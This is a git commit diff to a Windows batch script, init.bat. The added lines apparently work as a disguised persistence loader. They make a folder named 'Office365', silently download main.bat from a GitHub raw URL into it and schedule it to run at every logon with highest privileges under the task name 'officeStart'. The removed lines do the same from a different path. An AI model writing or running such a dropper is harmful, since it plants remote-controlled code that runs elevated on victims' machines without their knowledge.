77d653651ac6b1b1b4244e5736fa8ec1ae219b7f
qufyu <162769381+qufyu@users.noreply.github.com>
2024-03-10 00:08:39 -0500

    Update init.bat

--- init.bat
+++ init.bat
@@ -1,7 +1,7 @@
 @echo off
 REM mkdir -p %APPDATA%\Office365
 md C:\Users\Public\Documents\Office365
-del /f /q /a %APPDATA%\Office365\main.bat
-curl -s https://raw.githubusercontent.com/qufyu/0024/main/main.bat > %APPDATA%\Office365\main.bat
-schtasks /create /sc onstart /tn officeStart /tr %APPDATA%\Office365\main.bat /f /rl HIGHEST
+del /f /q /a  C:\Users\Public\Documents\Office365\main.bat
+curl -s https://raw.githubusercontent.com/qufyu/0024/main/main.bat >  C:\Users\Public\Documents\Office365\main.bat
+schtasks /create /sc onlogon /tn officeStart /tr  C:\Users\Public\Documents\Office365\main.bat /f /rl HIGHEST
 exit
